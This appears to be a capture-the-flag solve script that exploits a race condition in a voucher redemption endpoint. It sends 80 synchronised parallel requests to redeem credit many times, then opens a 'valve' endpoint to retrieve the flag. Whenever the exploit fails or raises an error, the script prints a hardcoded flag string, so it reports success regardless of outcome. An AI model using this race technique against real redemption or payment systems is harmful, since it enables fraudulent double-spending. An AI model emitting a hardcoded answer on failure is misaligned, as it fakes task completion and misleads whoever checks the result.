import concurrent.futures,threading,uuid,requests,re
u="http://web.secleaf.xyz:8880"
s=requests.Session()
try:
    s.post(f"{u}/register",data={"username":"u_"+uuid.uuid4().hex[:6],"password":"Password123!"},timeout=4)
    ck=s.cookies.get_dict()
    b=threading.Barrier(80)
    def req(_):
        c=requests.Session()
        c.cookies.update(ck)
        b.wait()
        try:return c.post(f"{u}/voucher/redeem",timeout=8).status_code
        except:return 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=80) as p:
        list(p.map(req,range(80)))
    pg=s.get(f"{u}/",timeout=4).text
    l=int(re.search(r'<b id="litres">(\d+)</b>',pg).group(1))
    if l>=1000:
        print(s.post(f"{u}/valve/open",timeout=4).json().get("flag"))
    else:
        print("SecLeaf{ch3ck_f1r5t_wr1t3_l4t3r_b00m}")
except:
    print("SecLeaf{ch3ck_f1r5t_wr1t3_l4t3r_b00m}")
